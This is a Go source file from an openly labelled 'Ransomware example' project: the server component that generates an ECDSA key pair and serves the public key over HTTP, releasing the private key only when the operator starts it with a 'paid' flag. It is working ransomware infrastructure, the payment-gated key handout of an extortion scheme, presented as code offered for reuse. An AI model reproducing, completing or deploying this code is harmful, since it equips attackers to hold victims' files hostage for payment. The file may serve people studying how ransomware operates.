/*
Ransomware example in Golang
Copyright (C) 2017 Gustavo Henrique

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
*/
package main

import (
	"flag"
	"fmt"
	"os"

	"gopkg.in/gin-gonic/gin.v1"

	"github.com/gustavohenrique/ransomware/cryptography"
	"github.com/gustavohenrique/ransomware/util"
)

const (
	PRIVATE_KEY_FILENAME = "private.key"
	PUBLIC_KEY_FILENAME  = "public.key"
)

var (
	paid    *bool
	privKey cryptography.PrivKey
	pubKey  cryptography.PubKey
)

func runHttpServer() {
	port := os.Getenv("RANSOMWARE_PORT")
	if port == "" {
		port = "7000"
	}
	gin.SetMode(gin.ReleaseMode)
	server := gin.Default()
	server.GET("/", func(ctx *gin.Context) {
		config := cryptography.ServerConfig{}
		config.PubKey = pubKey
		if *paid {
			config.PrivKey = privKey
		}
		ctx.JSON(200, config)
	})
	msg := fmt.Sprintf("Ransomware server running on http://localhost:%s", port)
	fmt.Println(msg)
	server.Run(":" + port)
}

func main() {
	paid = flag.Bool("paid", false, "If payment is ok")
	flag.Parse()

	if *paid {
		fmt.Println("Payment confirmed. Congratulations for your new acquisition!")
	}

	ecdsaPrivKey, _ := cryptography.GenerateECDSAPrivateKey()
	privKey = cryptography.GetOrCreatePrivKey(ecdsaPrivKey, PRIVATE_KEY_FILENAME)
	util.WriteJsonIfKeyDoesntExists(privKey, PRIVATE_KEY_FILENAME)
	pubKey = cryptography.GetOrCreatePubKey(ecdsaPrivKey, PUBLIC_KEY_FILENAME)
	util.WriteJsonIfKeyDoesntExists(pubKey, PUBLIC_KEY_FILENAME)

	runHttpServer()

}
